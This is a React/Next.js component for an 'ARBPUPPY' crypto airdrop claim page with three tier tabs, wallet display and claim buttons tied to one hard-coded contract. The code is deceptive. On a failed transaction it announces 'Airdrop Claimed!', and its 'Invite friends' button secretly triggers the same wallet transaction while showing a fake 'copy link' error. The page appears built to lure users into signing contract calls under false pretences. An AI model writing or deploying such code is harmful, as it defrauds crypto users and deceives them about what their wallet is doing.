import { NextPage } from 'next';
import { Tab } from '@headlessui/react';
import { useAddress } from '@thirdweb-dev/react';
import { Web3Button } from '@thirdweb-dev/react';
import styles from "../styles/Tab.module.css";
import { text } from 'stream/consumers';

const TAB:NextPage = () => {
    const address = useAddress();
    return(
    <div>
    <Tab.Group>
       
        <Tab.List className={styles.wallets}>
            <Tab className={styles.tab}> AIPUPPY Holder</Tab>
            <Tab className={styles.tab}> ARB Claimer</Tab>
            <Tab className={styles.tab}> Genesis Tier</Tab>
      
        </Tab.List>

        <Tab.Panels>
            <Tab.Panel>
                <div>
            <form method="post">
            <p className={styles.bot} style={{marginBottom:'-20px'}}> your wallet :</p>
                <div 
                className={styles.column} 
                style={{marginTop:'-10px'}}>               
                <p style={{alignItems:'center'}}>{address}</p>
                </div>
          
            </form>
            <div className={styles.column} style={{textAlign:'center'}}>
                <p>120.850.000.000 ARBPUPPY</p>
            </div>
            </div>

            <div style={{display:'flex', justifyContent:'center', gap:'30px'}}>
            <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Airdrop Claimed! sending tokens to your wallet within 12-48 hours");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Claim Airdrop</Web3Button>
           <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Failed to copy link! try manually");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Invite friends</Web3Button>  
                        </div>
            </Tab.Panel>

            <Tab.Panel>
            <div>
            <form method="post">
            <p className={styles.bot} style={{marginBottom:'-20px'}}> your wallet :</p>
                <div 
                className={styles.column} 
                style={{marginTop:'-10px'}}>               
                <p style={{alignItems:'center'}}>{address}</p>
                </div>
                <label htmlFor="tweet" >Retweet <a href='https://twitter.com/ARBPuppy' target='_blank'>
              pinned</a> tweet & enter retweet url (<a href='https://twitter.com/ARBPuppy' target='_blank'>Click Here</a>)</label>
            <input className={styles.column} style={{height:'45px'}} type="url"  
            id="first" 
            name="tweet" 
            placeholder="https://twitter.com/status/" />
            </form>
            <div className={styles.column} style={{textAlign:'center'}}>
                <p>65.850.000.000 ARBPUPPY</p>
            </div>
            </div>

            <div style={{display:'flex', justifyContent:'center', gap:'30px'}}>
            <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Airdrop Claimed! sending tokens to your wallet within 12-48 hours");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Claim Airdrop</Web3Button>
           <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Failed to copy link! try manually");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Invite friends</Web3Button>  
                        </div>
                </Tab.Panel>

            <Tab.Panel>  <div>
            <form method="post">
            <p className={styles.bot} style={{marginBottom:'-20px'}}> your wallet :</p>
                <div 
                className={styles.column} 
                style={{marginTop:'-10px'}}>               
                <p style={{alignItems:'center'}}>{address}</p>
                </div>
            <label htmlFor="tweet" >Retweet <a href='https://twitter.com/ARBPuppy' target='_blank'>
              pinned</a> tweet & enter retweet url (<a href='https://twitter.com/ARBPuppy' target='_blank'>Click Here</a>)</label>
            <input className={styles.column} style={{height:'45px'}} type="url"  
            id="first" 
            name="tweet" 
            placeholder="https://twitter.com/status/" />
            </form>
            <div className={styles.column} style={{textAlign:'center'}}>
                <p>50.150.000.000 ARBPUPPY</p>
            </div>
            </div>

            <div style={{display:'flex', justifyContent:'center', gap:'30px'}}>
            <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Airdrop Claimed! sending tokens to your wallet within 12-48 hours");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Claim Airdrop</Web3Button>
           <Web3Button
                          contractAddress={"0xED1dC015aefFFC2D2C78D2e872052cc5b0E17AC2"}
                          action={(cntr) => cntr.erc721.claim(0)}
                          onError={(err) => {
                            console.error(err);
                            alert("Failed to copy link! try manually");
                          }}
                          onSuccess={() => {
                            alert("");
                          }}
                        >Invite friends</Web3Button>  
                        </div></Tab.Panel>
        </Tab.Panels>
    </Tab.Group>
    </div>
);
};

export default TAB;